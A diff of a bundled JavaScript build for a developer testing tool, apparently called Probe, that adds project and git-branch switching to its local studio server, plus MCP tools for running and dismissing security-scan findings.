true; out.innerHTML = `<span class="muted">Asking ${esc(chosen() || runner.label)}\u2026</span>`;\n    const r = await post("/api/settings/test", { model: chosen() });\n    e.target.disabled = false;\n    out.innerHTML = r.ok\n      ? `<span class="pill passed">works</span> <span class="mono">${esc(r.model)}</span> answered on your plan.`\n      : `<span class="pill failed">not usable</span> <span class="mono">${esc(r.model)}</span>: ${esc(r.message)}`;\n  });\n  const reset = document.getElementById("sreset");\n  if (reset) reset.addEventListener("click", async () => { await post("/api/settings", { runner: "", model: "" }); renderSettings(); });\n}\n\nasync function renderDoctor(el) {\n  el.innerHTML = `<div class="empty">Checking the machine\u2026</div>`;\n  const checks = await api("/api/doctor");\n  el.innerHTML = `<h2>System checks</h2><table><thead><tr><th>Check</th><th>Status</th><th>Detail</th></tr></thead><tbody>\n    ${checks.map((c) => `<tr><td><strong>${esc(c.label)}</strong></td><td><span class="pill ${c.status}">${c.status}</span></td><td>${esc(c.detail)}${c.fix ? `<br><span class="muted">\u2192 ${esc(c.fix)}</span>` : ""}</td></tr>`).join("")}\n  </tbody></table>`;\n}\n\nconst STATUS_ICON = { ok: "\u2713", warn: "!", fail: "\u2715" };\nconst INIT_PILL = { done: ["ok", "\u2713"], todo: ["none", "\xB7"], waiting: ["warn", "\u2026"], warn: ["warn", "!"] };\nconst INIT_RUNNABLE = new Set(["config", "kit", "scan", "manifests", "cards", "agentfile"]);\n\n/**\n * Which features and platform areas get a manifest, side by side. Before any choice everything is\n * ticked; after one, only what was chosen, and areas the scan found since are marked new. One with\n * a written manifest stays chosen.\n */\nfunction areaPicker(k) {\n  const first = !k.chosen;\n  const box = (a) => `<label style="font-size:13px" title="${a.modules} modules \xB7 ${a.testable} testable classes \xB7 ${a.testFiles} test files"><input type="checkbox" data-feat="${esc(a.id)}" data-kind="${a.kind}" ${a.manifest ? "checked disabled" : a.chosen || first ? "checked" : ""}> ${esc(a.id)}${a.undecided && !first ? ` <span class="pill warn" style="font-size:10px">new</span>` : ""}</label>`;\n  const group = (kind, label, hint) => {\n    const list = k.proposed.filter((a) => a.kind === kind);\n    return list.length ? `<div class="k" style="margin-top:10px">${label} (${list.length})${hint ? ` <span class="muted" style="font-weight:400">\xB7 ${hint}</span>` : ""}</div>\n      <div class="row" style="flex-wrap:wrap;gap:4px 14px;margin:6px 0">${list.map(box).join("")}</div>` : "";\n  };\n  return `${group("feature", "Features to give a manifest", "")}\n    ${group("platform", "Platform areas to give a manifest", "shared code (core, common, the app module); its rules are proven by unit tests, and an edit in it marks the areas using it stale")}\n    <div class="row"><button class="btn" id="initchoose">Use the ticked ones</button>${k.proposed.some((a) => a.kind === "platform") ? `<button class="btn secondary" id="initplatform">Tick all platform areas</button>` : ""}<button class="btn secondary" id="initnone">Untick all</button></div>`;\n}\n\n/** `probe init` as a checklist: each step, the features to choose, and the drafts to review. */\nasync function renderInit(el) {\n  const k = await api("/api/init");\n  const open = k.steps.filter((s) => s.status === "todo" || s.status === "waiting");\n  const features = k.steps.find((s) => s.id === "features");\n  el.innerHTML = `<div class="box"><div class="row" style="flex-wrap:wrap"><h3 style="margin:0">${open.length ? `Feature knowledge: ${open.length} step${open.length === 1 ? "" : "s"} left` : "Feature knowledge: set up"}</h3><div style="flex:1"></div>\n      ${open.some((s) => s.status === "todo") ? `<button class="btn" id="initrun" ${k.running ? "disabled" : ""}>${k.running ? "Running\u2026" : "\u25B6 Run the next steps"}</button>` : ""}</div>\n    <p class="muted" style="margin:6px 0 0">The same steps as <code class="mono">probe init</code>. Each reads where the project stands, so running it again carries on and never redoes finished work. Manifests, card links and the agent file arrive below as drafts: nothing lands until you apply it, and nothing is committed.</p>\n    <ul class="setup">${k.steps.map((s) => `<li><span class="pill ${INIT_PILL[s.status][0]}">${INIT_PILL[s.status][1]}</span>\n      <div class="what"><strong>${esc(s.label)}</strong><div class="muted">${esc(s.detail)}</div></div>\n      ${s.status === "todo" && INIT_RUNNABLE.has(s.id) && !k.running ? `<button class="btn secondary" data-initstep="${s.id}">Run</button>` : ""}</li>`).join("")}</ul>\n    ${features.status === "waiting" && k.proposed.length ? areaPicker(k) : ""}\n  </div>\n  <div id="initpanel"></div>\n  ${k.drafts.map((d) => `<div class="box stale"><h3>${d.step === "agentfile" ? "Agent file" : d.step === "cards" ? `Cards for ${esc(d.feature)}` : `Manifest for ${esc(d.feature)}`} <span class="muted" style="font-weight:400">\xB7 drafted ${ago(d.createdAt)}</span></h3>\n      <p style="margin:4px 0 8px;white-space:pre-wrap">${esc(d.summary)}</p>\n      ${d.diffs.map((x) => `<div class="mono muted">${esc(x.path)}${x.conflict ? ` <span class="pill fail">changed since the draft was made</span>` : ""}</div>${diffHtml(x.diff)}`).join("")}\n      <div class="row"><button class="btn" data-iapprove="${esc(d.id)}" ${d.diffs.some((x) => x.conflict) ? "disabled" : ""}>Apply</button><button class="btn secondary" data-ireject="${esc(d.id)}">Reject</button></div></div>`).join("")}`;\n\n  const start = async (body) => {\n    const res = await post("/api/init/run", body);\n    if (res.error) return alert(res.error);\n    el.querySelectorAll("#initrun,[data-initstep]").forEach((b) => (b.disabled = true));\n    followRun(res.runId, document.getElementById("initpanel"), () => renderInit(el));\n  };\n  el.querySelector("#initrun")?.addEventListener("click", () => start({}));\n  el.querySelectorAll("[data-initstep]").forEach((b) => b.addEventListener("click", () => start({ step: b.dataset.initstep })));\n  el.querySelector("#initnone")?.addEventListener("click", () => el.querySelectorAll("[data-feat]:not(:disabled)").forEach((c) => (c.checked = false)));\n  el.querySelector("#initplatform")?.addEventListener("click", () => el.querySelectorAll(\'[data-feat][data-kind="platform"]\').forEach((c) => (c.checked = true)));\n  el.querySelector("#initchoose")?.addEventListener("click", async () => {\n    const chosen = [...el.querySelectorAll("[data-feat]")].filter((c) => c.checked).map((c) => c.dataset.feat);\n    if (!chosen.length) return alert("Tick at least one feature or platform area.");\n    const res = await post("/api/init/features", { features: chosen });\n    if (res.error) return alert(res.error);\n    renderInit(el);\n  });\n  el.querySelectorAll("[data-iapprove],[data-ireject]").forEach((b) => b.addEventListener("click", async () => {\n    const approve = !!b.dataset.iapprove;\n    const id = b.dataset.iapprove || b.dataset.ireject;\n    if (approve && !confirm("Write this draft into the project? Nothing is committed.")) return;\n    b.disabled = true;\n    const res = await post(`/api/drafts/${encodeURIComponent(id)}/${approve ? "approve" : "reject"}`, {});\n    if (!res.ok) alert(res.error);\n    renderInit(el);\n  }));\n  if (k.running) followRun(k.running, document.getElementById("initpanel"), () => renderInit(el));\n}\n\nasync function renderSetup() {\n  $view.innerHTML = `<div class="empty">Checking this project\u2026</div>`;\n  const items = await api("/api/setup");\n  const left = items.filter((i) => i.status !== "ok").length;\n  $view.innerHTML = `<div id="initwrap"></div><div class="box"><h3>${left ? `Device testing: ${left} thing${left === 1 ? "" : "s"} left to set up` : "Device testing: ready"}</h3>\n    <p class="muted" style="margin-top:0">Probe finds what it can on its own; anything it guessed is marked and can be changed in Settings. Nothing here needs a file edited by hand.</p>\n    <ul class="setup">${items.map((i) => `<li><span class="pill ${i.status}">${STATUS_ICON[i.status]}</span>\n      <div class="what"><strong>${esc(i.label)}</strong><div class="muted">${esc(i.detail)}</div></div>\n      ${i.action && i.status !== "ok" ? `<button class="btn secondary" data-go="${i.action.tab}">${esc(i.action.label)}</button>` : ""}</li>`).join("")}</ul></div>`;\n  $view.insertAdjacentHTML("beforeend", `<div id="docwrap"></div>`);\n  $view.querySelectorAll("button[data-go]").forEach((b) => b.addEventListener("click", () => { state.tab = b.dataset.go; render(); }));\n  renderDoctor(document.getElementById("docwrap"));\n  renderInit(document.getElementById("initwrap"));\n}\n\n// Links inside the page (#setup, #runs/<id>) go where they say; saveRoute\'s replaceState does not fire this.\nwindow.addEventListener("hashchange", () => { if (loadRoute()) render(); });\ndocument.addEventListener("keydown", (e) => {\n  if (e.key === "Escape" && state.tab === "runs" && runsState().selected && !e.target.closest?.("input, textarea, select")) closeRun();\n});\n\n(async () => {\n  await Promise.all([checkBranch(), refreshJobs()]);\n  // Back where the page was; else on work still going; else a project that cannot be tested\n  // yet opens on what is missing.\n  if (loadRoute()) return render();\n  const latest = state.jobs[state.jobs.length - 1];\n  if (latest) {\n    goTo(routeOf(latest));\n    state.followId = latest.runId;\n    return render();\n  }\n  const [items, init] = await Promise.all([api("/api/setup").catch(() => []), api("/api/init").catch(() => null)]);\n  const knowledgeOpen = init && init.steps.some((s) => ["features", "manifests"].includes(s.id) && s.status !== "done");\n  if (items.some((i) => i.status === "fail") || knowledgeOpen) state.tab = "setup";\n  render();\n})();\n</script>\n</body>\n</html>\n';
 
 // src/engine/watcher.ts
-var import_node_fs27 = require("node:fs");
-var import_node_path35 = require("node:path");
+var import_node_fs32 = require("node:fs");
+var import_node_path43 = require("node:path");
 
 // src/engine/watch.ts
-var import_node_child_process8 = require("node:child_process");
-var import_node_fs26 = require("node:fs");
-var import_node_path34 = require("node:path");
+var import_node_child_process9 = require("node:child_process");
+var import_node_fs31 = require("node:fs");
+var import_node_path42 = require("node:path");
 
 // src/knowledge/proof.ts
 function findRule(project, ref) {
@@ -33748,12 +35479,12 @@ function summarizeRules(project, manifest) {
   return ruleProofs(project, manifest).map(summarizeRule).join("\n");
 }
 async function runRuleCards(project, ref, options = {}) {
-  const found = findRule(project, ref);
-  if ("error" in found) return { rule: ref, runs: [], skipped: [], error: found.error };
-  const rule = `${found.manifest.id}/${found.invariant.id}`;
-  const proof = ruleProofs(project, found.manifest).find((p) => p.invariant.id === found.invariant.id);
+  const found3 = findRule(project, ref);
+  if ("error" in found3) return { rule: ref, runs: [], skipped: [], error: found3.error };
+  const rule2 = `${found3.manifest.id}/${found3.invariant.id}`;
+  const proof = ruleProofs(project, found3.manifest).find((p) => p.invariant.id === found3.invariant.id);
   if (!proof.cards.length) {
-    return { rule, runs: [], skipped: [], error: `${rule} has no cards. ${found.invariant.coveredBy.length ? "Its unit tests prove it." : "Write one (probe_cards_save) and list it under the rule's cards:."}` };
+    return { rule: rule2, runs: [], skipped: [], error: `${rule2} has no cards. ${found3.invariant.coveredBy.length ? "Its unit tests prove it." : "Write one (probe_cards_save) and list it under the rule's cards:."}` };
   }
   const runs = [];
   const skipped = [];
@@ -33762,11 +35493,11 @@ async function runRuleCards(project, ref, options = {}) {
       skipped.push(`${c.ref} (no such card)`);
       continue;
     }
-    options.log?.(`${rule}: running ${c.feature}/${c.id}`);
+    options.log?.(`${rule2}: running ${c.feature}/${c.id}`);
     const { done } = startCardRun(project, c.feature, c.id, { device: options.device, model: options.model });
     runs.push(await done);
   }
-  return { rule, runs, skipped };
+  return { rule: rule2, runs, skipped };
 }
 function summarizeRuleRun(r) {
   if (r.error) return r.error;
@@ -33782,10 +35513,10 @@ function loadWatch(project) {
   return { stale: {}, checks: [], ...project.store.read(STATE2) ?? {} };
 }
 function saveWatch(project, state) {
-  const file = (0, import_node_path34.join)(project.store.dir, STATE2);
+  const file = (0, import_node_path42.join)(project.store.dir, STATE2);
   const tmp = `${file}.${process.pid}.tmp`;
-  (0, import_node_fs26.writeFileSync)(tmp, JSON.stringify({ ...state, checks: state.checks.slice(-100) }, null, 2));
-  (0, import_node_fs26.renameSync)(tmp, file);
+  (0, import_node_fs31.writeFileSync)(tmp, JSON.stringify({ ...state, checks: state.checks.slice(-100) }, null, 2));
+  (0, import_node_fs31.renameSync)(tmp, file);
 }
 function update(project, change) {
   const state = loadWatch(project);
@@ -33794,8 +35525,8 @@ function update(project, change) {
   return state;
 }
 function projectFiles(project, files) {
-  const ignored = ignoredPathPattern(project.adapter);
-  return files.map((f) => (0, import_node_path34.relative)(project.root, (0, import_node_path34.isAbsolute)(f) ? f : (0, import_node_path34.resolve)(project.root, f)).replace(/\\/g, "/")).filter((f) => f && !f.startsWith("..") && !ignored.test(f) && !f.startsWith("probe/"));
+  const ignored2 = ignoredPathPattern(project.adapter);
+  return files.map((f) => (0, import_node_path42.relative)(project.root, (0, import_node_path42.isAbsolute)(f) ? f : (0, import_node_path42.resolve)(project.root, f)).replace(/\\/g, "/")).filter((f) => f && !f.startsWith("..") && !ignored2.test(f) && !f.startsWith("probe/"));
 }
 function featuresForFiles(project, files, result = latestScan(project)) {
   const out = /* @__PURE__ */ new Map();
@@ -33854,7 +35585,7 @@ function sweepDirty(project, source, session) {
   if (since === null) return [];
   const recent = [...dirtyFiles(project.root).keys()].filter((f) => {
     try {
-      return (0, import_node_fs26.statSync)((0, import_node_path34.join)(project.root, f)).mtimeMs > since;
+      return (0, import_node_fs31.statSync)((0, import_node_path42.join)(project.root, f)).mtimeMs > since;
     } catch {
       return false;
     }
@@ -33907,7 +35638,7 @@ function startCheck(project, options = {}) {
       if (run.status === "error") run.error = `The build failed before the tests ran: ${run.features.filter((f) => f.unitStatus === "error").map((f) => f.feature).join(", ")}.`;
       if (!run.features.length) log("nothing stale to check");
     } finally {
-      (0, import_node_fs26.rmSync)((0, import_node_path34.join)(project.store.dir, LOCK), { force: true });
+      (0, import_node_fs31.rmSync)((0, import_node_path42.join)(project.store.dir, LOCK), { force: true });
     }
   });
   return started;
@@ -33951,7 +35682,7 @@ async function checkFeature(project, run, target, options, log) {
       return null;
     }
   })();
-  const check2 = (0, import_node_fs26.existsSync)((0, import_node_path34.join)(project.root, manifestFile(target.feature))) ? checkManifest(project.root, target.feature) : null;
+  const check2 = (0, import_node_fs31.existsSync)((0, import_node_path42.join)(project.root, manifestFile(target.feature))) ? checkManifest(project.root, target.feature) : null;
   if (check2) {
     const broken = check2.broken.length + check2.brokenCards.length;
     f.manifest = { links: check2.links + check2.cardLinks, broken, gaps: check2.gaps.length, errors: check2.errors.length };
@@ -34022,6 +35753,9 @@ function summarizeCheckRun(run) {
 function recordStudio(project, url) {
   project.store.write(STUDIO, { url, pid: process.pid });
 }
+function clearStudio(project) {
+  project.store.write(STUDIO, null);
+}
 async function kickCheck(project, trigger) {
   if (runningCheck(project)) return "busy";
   const studio = project.store.read(STUDIO);
@@ -34032,7 +35766,7 @@ async function kickCheck(project, trigger) {
     } catch {
     }
   }
-  const child = (0, import_node_child_process8.spawn)(process.execPath, [(0, import_node_path34.resolve)(process.argv[1]), "check", "--trigger", trigger, "--project", project.root], {
+  const child = (0, import_node_child_process9.spawn)(process.execPath, [(0, import_node_path42.resolve)(process.argv[1]), "check", "--trigger", trigger, "--project", project.root], {
     cwd: project.root,
     detached: true,
     stdio: "ignore",
@@ -34095,7 +35829,7 @@ function startWatcher(project, log = () => {
       return;
     }
     const known = new Set(Object.values(loadWatch(project).stale).flatMap((e) => e.files));
-    const fresh = files.filter((f) => !known.has(f) && isFile((0, import_node_path35.join)(project.root, f)));
+    const fresh = files.filter((f) => !known.has(f) && isFile((0, import_node_path43.join)(project.root, f)));
     const features = markStale(project, fresh, "editor");
     if (!features.length) return;
     log(`watch: untracked edits made ${features.join(", ")} stale`);
@@ -34109,13 +35843,13 @@ function startWatcher(project, log = () => {
     const started = startCheck(project, { trigger: "editor" });
     if (started) log(`watch: checking ${stale.length} stale feature(s) (run ${started.run.id})`);
   };
-  const ignored = ignoredPathPattern(project.adapter);
+  const ignored2 = ignoredPathPattern(project.adapter);
   let watcher;
   try {
-    watcher = (0, import_node_fs27.watch)(project.root, { recursive: true }, (_event, name) => {
+    watcher = (0, import_node_fs32.watch)(project.root, { recursive: true }, (_event, name) => {
       if (!name) return;
       const file = name.toString().replace(/\\/g, "/");
-      if (ignored.test(file)) return;
+      if (ignored2.test(file)) return;
       pending.add(file);
       clearTimeout(settle);
       settle = setTimeout(flush, SETTLE_MS);
@@ -34133,7 +35867,7 @@ function startWatcher(project, log = () => {
 }
 function isFile(path) {
   try {
-    return (0, import_node_fs27.statSync)(path).isFile();
+    return (0, import_node_fs32.statSync)(path).isFile();
   } catch {
     return false;
   }
@@ -34153,6 +35887,7 @@ var jobKeys = {
   card: (feature, cardId) => `card:${feature}/${cardId}`,
   login: (role) => `login:${role || "check"}`,
   fix: (issueId) => `fix:${issueId}`,
+  security: (feature) => `security:${feature || "*"}`,
   init: () => "init",
   check: () => "check",
   verify(o) {
@@ -34194,13 +35929,13 @@ function startJob(key, start) {
 }
 
 // src/studio/project.ts
-var import_node_fs28 = require("node:fs");
+var import_node_fs33 = require("node:fs");
 function projectSettings(project) {
   const c = project.config;
   const supported = project.adapter.supportsDevices;
   const devices = supported ? listDevices(Adb.forProject(project.root)) : [];
   return {
-    configFile: (0, import_node_fs28.existsSync)(configPath(project.root)),
+    configFile: (0, import_node_fs33.existsSync)(configPath(project.root)),
     app: resolveApp(project),
     appSet: c.app,
     devices: {
@@ -34352,27 +36087,38 @@ var watchLog = [];
 async function startStudio(project, preferredPort = 7777) {
   if (running) return running.url;
   for (let port = preferredPort; port < preferredPort + 20; port++) {
-    const server = createStudioServer(project);
-    const ok = await new Promise((resolve7) => {
-      server.once("error", () => resolve7(false));
-      server.listen(port, "127.0.0.1", () => resolve7(true));
+    const current3 = { project };
+    const server = createStudioServer(current3);
+    const ok = await new Promise((resolve9) => {
+      server.once("error", () => resolve9(false));
+      server.listen(port, "127.0.0.1", () => resolve9(true));
     });
     if (ok) {
       running = { server, url: `http://localhost:${port}` };
-      recordStudio(project, running.url);
-      if (project.config.watch.enabled) startWatcher(project, (line) => watchLog.push(`${(/* @__PURE__ */ new Date()).toISOString().slice(11, 19)} ${line}`) > 50 && watchLog.shift());
+      attach(current3, project);
       return running.url;
     }
   }
   throw new Error(`No free port between ${preferredPort} and ${preferredPort + 19}`);
 }
-function createStudioServer(project) {
-  return (0, import_node_http.createServer)((req, res) => handle(project, req, res).catch((e) => send(res, 500, { error: String(e) })));
+function attach(current3, project) {
+  current3.stopWatcher?.();
+  current3.stopWatcher = void 0;
+  if (current3.project !== project) clearStudio(current3.project);
+  current3.project = project;
+  watchLog.length = 0;
+  if (running) recordStudio(project, running.url);
+  if (project.config.watch.enabled) current3.stopWatcher = startWatcher(project, (line) => watchLog.push(`${(/* @__PURE__ */ new Date()).toISOString().slice(11, 19)} ${line}`) > 50 && watchLog.shift());
 }
-async function handle(project, req, res) {
+function createStudioServer(target) {
+  const current3 = "store" in target ? { project: target } : target;
+  return (0, import_node_http.createServer)((req, res) => handle(current3, req, res).catch((e) => send(res, 500, { error: String(e) })));
+}
+async function handle(current3, req, res) {
   const url = new URL(req.url ?? "/", "http://localhost");
   const path = url.pathname;
   const method = req.method ?? "GET";
+  const project = current3.project;
   const origin = req.headers.origin;
   if (method !== "GET" && origin && !/^http:\/\/(localhost|127\.0\.0\.1):\d+$/.test(origin)) return send(res, 403, { error: "cross-origin request refused" });
   if (method === "GET" && path === "/") {
@@ -34384,6 +36130,40 @@ async function handle(project, req, res) {
   const header = req.headers["x-probe-branch"];
   const mismatch = isAction ? branchMismatch(project, typeof header === "string" ? decodeURIComponent(header) : void 0) : null;
   if (mismatch) return send(res, 409, { error: mismatch, branchChanged: true });
+  if (method === "GET" && path === "/api/projects") {
+    const list = knownProjects();
+    const here = { root: project.root, name: project.name, adapter: project.adapter.id };
+    return send(res, 200, { current: here, projects: list.some((p) => p.root.toLowerCase() === project.root.toLowerCase()) ? list : [{ ...here, scannedAt: "" }, ...list] });
+  }
+  if (method === "POST" && path === "/api/projects/open") {
+    const body = JSON.parse(await readBody(req) || "{}");
+    if (!body.root?.trim()) return send(res, 400, { error: "Give the project folder." });
+    let next;
+    try {
+      next = openProject(body.root.trim());
+    } catch (e) {
+      return send(res, 400, { error: e.message });
+    }
+    if (next.root.toLowerCase() !== project.root.toLowerCase()) {
+      if (!next.store.read("scan.json")) scan(next);
+      attach(current3, next);
+    }
+    return send(res, 200, { root: next.root, name: next.name });
+  }
+  if (method === "POST" && path === "/api/branch/switch") {
+    const body = JSON.parse(await readBody(req) || "{}");
+    const want = body.branch?.trim();
+    if (!want || want.startsWith("-")) return send(res, 400, { error: "Give a branch." });
+    const info = branchInfo(project);
+    if (!info.git) return send(res, 400, { error: "Not a git repository." });
+    if (info.git.dirty) return send(res, 409, { error: `${info.git.dirty} uncommitted file(s): commit or stash them before switching.` });
+    if (runningJobs().length) return send(res, 409, { error: "Runs are still going: stop them or wait before switching." });
+    const local = want.replace(/^origin\//, "");
+    const out = (0, import_node_child_process10.spawnSync)("git", ["switch", local], { cwd: project.root, encoding: "utf8" });
+    if (out.status !== 0) return send(res, 400, { error: (out.stderr || out.stdout || "git switch failed").trim() });
+    scan(project);
+    return send(res, 200, branchInfo(project));
+  }
   if (method === "GET" && path === "/api/branch") return send(res, 200, branchInfo(project, url.searchParams.has("branches")));
   if (method === "GET" && path === "/api/setup") return send(res, 200, setupChecklist(project));
   if (method === "GET" && path === "/api/init") {
@@ -34466,7 +36246,7 @@ async function handle(project, req, res) {
       manifest = loadManifest(project.root, id);
     } catch {
     }
-    const exists = (0, import_node_fs29.existsSync)((0, import_node_path36.join)(project.root, manifestFile(id)));
+    const exists = (0, import_node_fs34.existsSync)((0, import_node_path44.join)(project.root, manifestFile(id)));
     return send(res, 200, {
       file: manifestFile(id),
       manifest,
@@ -34554,10 +36334,10 @@ async function handle(project, req, res) {
   }
   m = /^\/api\/runs\/([^/]+)\/files\/([\w.-]+\.(png|mp4))$/.exec(path);
   if (method === "GET" && m) {
-    const file = (0, import_node_path36.join)(project.store.dir, "runs", m[1], m[2]);
-    if (!/^[\w-]+$/.test(m[1]) || !(0, import_node_fs29.existsSync)(file)) return send(res, 404, { error: "no such file" });
+    const file = (0, import_node_path44.join)(project.store.dir, "runs", m[1], m[2]);
+    if (!/^[\w-]+$/.test(m[1]) || !(0, import_node_fs34.existsSync)(file)) return send(res, 404, { error: "no such file" });
     res.writeHead(200, { "content-type": m[3] === "png" ? "image/png" : "video/mp4", "cache-control": "max-age=3600" });
-    (0, import_node_fs29.createReadStream)(file).pipe(res);
+    (0, import_node_fs34.createReadStream)(file).pipe(res);
     return;
   }
   m = /^\/api\/cards\/([^/]+)\/([^/]+)\/status$/.exec(path);
@@ -34623,12 +36403,38 @@ async function handle(project, req, res) {
     const run = project.store.read(`runs/${m[1]}.json`);
     return run ? send(res, 200, issuesOf(project, run)) : send(res, 404, { error: "unknown run" });
   }
+  if (method === "GET" && path === "/api/security") {
+    const runs = project.store.listRuns().filter((r) => r.kind === "security").map(({ log: _log, ...r }) => r);
+    const latest = runs.find((r) => r.feature === "*") ?? runs[0] ?? null;
+    return send(res, 200, { latest, recent: runs.slice(0, 10).map((r) => ({ id: r.id, feature: r.feature, status: r.status, startedAt: r.startedAt, open: r.findings.length })), dismissed: loadDismissals(project), rules: RULES.length, url: project.config.security.url ?? null });
+  }
+  if (method === "POST" && path === "/api/security") {
+    const body = JSON.parse(await readBody(req) || "{}");
+    try {
+      return send(res, 200, startJob(jobKeys.security(body.feature), () => startSecurityRun(project, { feature: body.feature || void 0, agent: body.agent, url: body.url || void 0 })));
+    } catch (e) {
+      return send(res, 400, { error: e.message });
+    }
+  }
+  if (method === "POST" && path === "/api/security/undismiss") {
+    const body = JSON.parse(await readBody(req) || "{}");
+    return send(res, 200, { ok: undismiss(project, body.fingerprint ?? "") });
+  }
+  m = /^\/api\/issues\/([^/]+)\/dismiss$/.exec(path);
+  if (method === "POST" && m) {
+    const body = JSON.parse(await readBody(req) || "{}");
+    try {
+      return send(res, 200, dismissIssue(project, decodeURIComponent(m[1]), body.reason ?? ""));
+    } catch (e) {
+      return send(res, 400, { error: e.message });
+    }
+  }
   m = /^\/api\/issues\/([^/]+)\/(prompt|fix)$/.exec(path);
   if (m) {
     const id = decodeURIComponent(m[1]);
-    const found = findIssue(project, id);
-    if (!found) return send(res, 404, { error: `unknown issue ${id}` });
-    if (method === "GET" && m[2] === "prompt") return send(res, 200, { prompt: fixPrompt(project, found.issue, found.run, false) });
+    const found3 = findIssue(project, id);
+    if (!found3) return send(res, 404, { error: `unknown issue ${id}` });
+    if (method === "GET" && m[2] === "prompt") return send(res, 200, { prompt: fixPrompt(project, found3.issue, found3.run, false) });
     if (method === "POST" && m[2] === "fix") {
       return send(res, 200, startJob(jobKeys.fix(id), () => startFix(project, id)));
     }
@@ -34711,10 +36517,10 @@ function proposedAreaRows(project) {
   return proposedAreas(project).map((a) => ({ ...a, chosen: chosen.has(a.id), undecided: undecided.has(a.id), manifest: written.has(a.id) }));
 }
 function readBody(req) {
-  return new Promise((resolve7, reject) => {
+  return new Promise((resolve9, reject) => {
     let body = "";
     req.on("data", (chunk) => body += chunk.toString());
-    req.on("end", () => resolve7(body || "{}"));
+    req.on("end", () => resolve9(body || "{}"));
     req.on("error", reject);
   });
 }
@@ -34802,12 +36608,12 @@ ${e.files.slice(0, 10).map((f) => `    ${f}`).join("\n")}`);
         feature: external_exports.string().optional().describe("Every rule of this feature.")
       }
     },
-    async ({ projectDir: dir, rule, feature }) => {
+    async ({ projectDir: dir, rule: rule2, feature }) => {
       const project = openProject(dir);
-      if (rule) {
-        const found = findRule(project, rule);
-        if ("error" in found) return text(found.error);
-        return text(summarizeRule(ruleProofs(project, found.manifest).find((p) => p.invariant.id === found.invariant.id)));
+      if (rule2) {
+        const found3 = findRule(project, rule2);
+        if ("error" in found3) return text(found3.error);
+        return text(summarizeRule(ruleProofs(project, found3.manifest).find((p) => p.invariant.id === found3.invariant.id)));
       }
       if (!feature) return text("Give a rule (feature/rule-id) or a feature.");
       const manifest = loadManifest(project.root, feature);
@@ -35099,9 +36905,9 @@ ${r.errors.join("\n")}` : ""
         device: external_exports.string().optional().describe("Device serial")
       }
     },
-    async ({ projectDir: dir, feature, card, rule, device }) => {
+    async ({ projectDir: dir, feature, card, rule: rule2, device }) => {
       const project = openProject(dir);
-      if (rule) return text(summarizeRuleRun(await runRuleCards(project, rule, { device })));
+      if (rule2) return text(summarizeRuleRun(await runRuleCards(project, rule2, { device })));
       if (!feature || !card) return text("Give feature and card, or a rule.");
       const { done } = startCardRun(project, feature, card, { device });
       return text(summarizeCardRun(await done));
@@ -35145,7 +36951,7 @@ ${r.errors.join("\n")}` : ""
     "probe_issues",
     {
       title: "Problems a run found",
-      description: "Lists the fixable problems of a run (failing tests, unmet card expectations, crashes, navigation issues, performance warnings), each with an issue id for probe_fix_prompt / probe_fix. A verify run lists the issues of the runs it started.",
+      description: "Lists the fixable problems of a run (failing tests, unmet card expectations, crashes, navigation issues, performance warnings, security findings), each with an issue id for probe_fix_prompt / probe_fix. A verify run lists the issues of the runs it started.",
       inputSchema: { projectDir, runId: external_exports.string() }
     },
     async ({ projectDir: dir, runId }) => {
@@ -35165,8 +36971,8 @@ ${r.errors.join("\n")}` : ""
     },
     async ({ projectDir: dir, issueId }) => {
       const project = openProject(dir);
-      const found = findIssue(project, issueId);
-      return text(found ? fixPrompt(project, found.issue, found.run, false) : `No issue ${issueId}.`);
+      const found3 = findIssue(project, issueId);
+      return text(found3 ? fixPrompt(project, found3.issue, found3.run, false) : `No issue ${issueId}.`);
     }
   );
   server.registerTool(
@@ -35179,6 +36985,36 @@ ${r.errors.join("\n")}` : ""
     async ({ projectDir: dir, issueId }) => {
       const { done } = startFix(openProject(dir), issueId);
       return text(summarizeFix(await done));
+    }
+  );
+  server.registerTool(
+    "probe_security",
+    {
+      title: "Security checks",
+      description: "Security checks picked by the project's platforms (Android, iOS, web, Node/Python/JVM/Go/.NET/PHP/Ruby backends, React Native, Flutter, KMP, Electron, Tauri, Docker, CI, IaC): pattern rules from the catalog in docs/security, dependencies against OSV, secrets in git history, the built APK/IPA/web bundle, the running app (a local URL, the installed Android app on an emulator), and with agent: true an agent reviewing the code for authorization and logic flaws. Each finding is an issue for probe_fix_prompt / probe_fix, or probe_security_dismiss. With a feature: only its files. The agent review takes minutes.",
+      inputSchema: {
+        projectDir,
+        feature: external_exports.string().optional().describe("One feature; unset: the whole project"),
+        agent: external_exports.boolean().optional().describe("Also have an agent review the code (costs an agent run per feature)"),
+        layers: external_exports.array(external_exports.enum(ALL_LAYERS)).optional().describe("Layers to run; unset: every layer that can run"),
+        url: external_exports.string().optional().describe("Local URL of the running app for runtime checks (localhost only)")
+      }
+    },
+    async ({ projectDir: dir, feature, agent, layers, url }) => {
+      const { done } = startSecurityRun(openProject(dir), { feature, agent, layers, url });
+      return text(summarizeSecurity(await done));
+    }
+  );
+  server.registerTool(
+    "probe_security_dismiss",
+    {
+      title: "Dismiss a security finding",
+      description: "Marks a security issue as not a problem here, with the reason. Later runs count it as dismissed instead of listing it. Only when the user agrees it is not an issue.",
+      inputSchema: { projectDir, issueId: external_exports.string(), reason: external_exports.string().min(3) }
+    },
+    async ({ projectDir: dir, issueId, reason }) => {
+      const d = dismissIssue(openProject(dir), issueId, reason);
+      return text(`Dismissed ${d.check}${d.file ? ` in ${d.file}` : ""}: ${d.reason}`);
     }
   );
   server.registerTool(
@@ -35249,8 +37085,8 @@ ${d.body}`);
 }
 
 // src/cli/hook.ts
-var import_node_fs30 = require("node:fs");
-var import_node_path37 = require("node:path");
+var import_node_fs35 = require("node:fs");
+var import_node_path45 = require("node:path");
 async function runHook(event, options = {}) {
   try {
     const stdin = options.files?.length ? "" : await readStdin();
@@ -35265,7 +37101,7 @@ async function runHook(event, options = {}) {
 `);
     if (event === "edit") {
       const file = hook.tool_input?.file_path ?? hook.tool_input?.notebook_path;
-      const files = claude ? file ? [file] : [] : (options.files ?? []).map((f) => (0, import_node_path37.isAbsolute)(f) ? f : (0, import_node_path37.resolve)(process.cwd(), f));
+      const files = claude ? file ? [file] : [] : (options.files ?? []).map((f) => (0, import_node_path45.isAbsolute)(f) ? f : (0, import_node_path45.resolve)(process.cwd(), f));
       const touched = files.length ? markStale(project, files, source, session) : claude ? [] : sweepDirty(project, source, session);
       if (!claude && touched.length) say(`Probe: ${touched.join(", ")} stale`);
       return 0;
@@ -35300,7 +37136,7 @@ async function runHook(event, options = {}) {
     }
     if (event === "commit") {
